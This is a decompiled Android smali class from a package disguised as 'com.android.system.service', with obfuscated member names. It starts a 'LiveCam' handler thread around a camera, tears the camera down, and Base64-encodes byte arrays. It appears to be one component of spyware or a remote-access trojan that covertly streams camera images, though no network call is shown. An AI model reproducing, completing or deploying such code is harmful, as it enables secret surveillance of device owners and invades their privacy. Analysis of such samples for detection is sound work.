.class public Lcom/android/system/service/o;
.super Ljava/lang/Object;
.source ""


.field private static volatile a:Z

.field private static volatile b:Landroid/hardware/Camera;

.field private static c:I

.field private static d:Landroid/os/Handler;


.method public static a(I)V
    .locals 3

    :try_start_0
    new-instance v0, Landroid/os/HandlerThread;

    const-string v1, "LiveCam"

    invoke-direct {v0, v1}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    new-instance v1, Landroid/os/Handler;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v0

    invoke-direct {v1, v0}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    sput-object v1, Lcom/android/system/service/o;->d:Landroid/os/Handler;

    sput p0, Lcom/android/system/service/o;->c:I

    const/4 p0, 0x1

    sput-boolean p0, Lcom/android/system/service/o;->a:Z

    new-instance p0, Lcom/android/system/service/o$b;

    invoke-direct {p0}, Lcom/android/system/service/o$b;-><init>()V

    sget-object v0, Lcom/android/system/service/o;->d:Landroid/os/Handler;

    invoke-virtual {v0, p0}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Ljava/lang/Exception;->printStackTrace()V

    :goto_0
    return-void
.end method

.method public static b()V
    .locals 2

    const/4 v0, 0x0

    sput-boolean v0, Lcom/android/system/service/o;->a:Z

    sget-object v0, Lcom/android/system/service/o;->d:Landroid/os/Handler;

    if-eqz v0, :cond_0

    const/4 v1, 0x0

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacksAndMessages(Ljava/lang/Object;)V

    sput-object v1, Lcom/android/system/service/o;->d:Landroid/os/Handler;

    :cond_0
    sget-object v0, Lcom/android/system/service/o;->b:Landroid/hardware/Camera;

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V

    sget-object v0, Lcom/android/system/service/o;->b:Landroid/hardware/Camera;

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    const/4 v0, 0x0

    sput-object v0, Lcom/android/system/service/o;->b:Landroid/hardware/Camera;

    :cond_1
    return-void
.end method

.method public static c([B)Ljava/lang/String;
    .locals 1

    const/4 v0, 0x0

    invoke-static {p0, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p0

    return-object p0
.end method
